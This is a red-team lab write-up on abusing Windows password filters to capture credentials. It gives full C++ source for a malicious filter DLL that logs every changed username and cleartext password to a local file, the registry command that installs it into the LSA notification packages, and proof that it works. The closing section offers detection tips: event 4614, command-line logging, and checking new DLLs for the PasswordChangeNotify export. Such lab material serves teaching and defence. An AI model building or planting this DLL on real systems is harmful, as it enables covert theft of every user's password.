# Password Filter

## Password Filter

This lab explores a native OS notification of when the user account password gets changed, which is responsible for validating it. That, of course means, that the password can be intercepted and logged.

### Execution

Password filters are registered in registry and we can see them here:

{% code title="attacker\@victim" %}
```csharp
reg query "hklm\system\currentcontrolset\control\lsa" /v "notification packages"
```
{% endcode %}

Or via regedit:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKYaBDcAhyh5ndQE8MA%2F-LKYbQZL4cQICa8p9TXc%2Fpassword-filter-regedit.png?alt=media\&token=15e6884b-22e5-4c46-89df-8df903e02b53)

Building an evil filter DLL based on a great [article](http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html) by mubix. He has also kindly provided the code to use, which I modified slightly to make sure that the critical DLL functions were exported correctly in order for this technique to work, since mubix's code did not work for me out of the box. I also had to change the logging statements in order to rectify a couple of compiler issues:

```cpp
#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <WinInet.h>
#include <ntsecapi.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
using namespace std;

void writeToLog(const char* szString)
{
	FILE *pFile;
	fopen_s(&pFile, "c:\\logFile.txt", "a+");

	if (NULL == pFile)
	{
		return;
	}
	fprintf(pFile, "%s\r\n", szString);
	fclose(pFile);
	return;

}

extern "C" __declspec(dllexport) BOOLEAN __stdcall InitializeChangeNotify(void)
{
	OutputDebugString(L"InitializeChangeNotify");
	writeToLog("InitializeChangeNotify()");
	return TRUE;
}

extern "C" __declspec(dllexport) BOOLEAN __stdcall PasswordFilter(
	PUNICODE_STRING AccountName,
	PUNICODE_STRING FullName,
	PUNICODE_STRING Password,
	BOOLEAN SetOperation)
{
	OutputDebugString(L"PasswordFilter");
	return TRUE;
}

extern "C" __declspec(dllexport) NTSTATUS __stdcall PasswordChangeNotify(
	PUNICODE_STRING UserName,
	ULONG RelativeId,
	PUNICODE_STRING NewPassword)
{
	FILE *pFile;
	fopen_s(&pFile, "c:\\logFile.txt", "a+");

	OutputDebugString(L"PasswordChangeNotify");
	if (NULL == pFile)
	{
		return true;
	}
	fprintf(pFile, "%ws:%ws\r\n", UserName->Buffer, NewPassword->Buffer);
	fclose(pFile);
	return 0;
}
```

Injecting the evil password filter into the victim system:

{% code title="attacker\@victim" %}
```csharp
reg add "hklm\system\currentcontrolset\control\lsa" /v "notification packages" /d scecli\0evilpwfilter /t reg_multi_sz

Value notification packages exists, overwrite(Yes/No)? yes
The operation completed successfully.
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKYaBDcAhyh5ndQE8MA%2F-LKYdBg-yZHIx4vB1yXP%2Fpassword-filter-updating-registry.png?alt=media\&token=41c53eb4-3135-4cf9-aa53-1e4e08e70c8d)

Testing password changes after the reboot - note how the password changes are getting logged:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKYaBDcAhyh5ndQE8MA%2F-LKYd9rtn7s7IilQ7bJq%2Fpassword-filter-filter-working.png?alt=media\&token=6881b4b5-087c-419d-81de-9c6c789d6345)

### Observations

Windows event `4614` notifies about new packages loaded by the SAM:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKYhpUHcVA8_ca8ON7n%2F-LKYg-F4MZr0zO6m4PsS%2Fpassword-filter-log1.png?alt=media\&token=69021c5e-d37b-40b0-b2e9-0da899c2d134)

Logging command line can also help in detecting this activity:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKYhpUHcVA8_ca8ON7n%2F-LKYh4fz4TjhdJDoMF3g%2Fpassword-filter-cmdline.png?alt=media\&token=46ac36d2-2dcf-494f-8c28-09fb76d28107)

...especially, if the package has just been recently dropped to disk:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKYkZcTyflYSP9Q2nE3%2F-LKYkkhF-apErnkYBrbS%2Fpassword-filter-createdtime.png?alt=media\&token=0300beb8-803b-4bc9-bc57-304376958132)

Also, it may be worth considering checking new DLLs dropped to `%systemroot%\system32` for exported `PasswordChangeNotify`function:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKYhpUHcVA8_ca8ON7n%2F-LKYhmcM2gJNkHc9BqP1%2Fpassword-filter.png?alt=media\&token=117e41ae-f22c-4cb0-ad89-9d3b8ab55616)

### References

{% embed url="http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html" %}

{% embed url="https://attack.mitre.org/wiki/Technique/T1174" %}
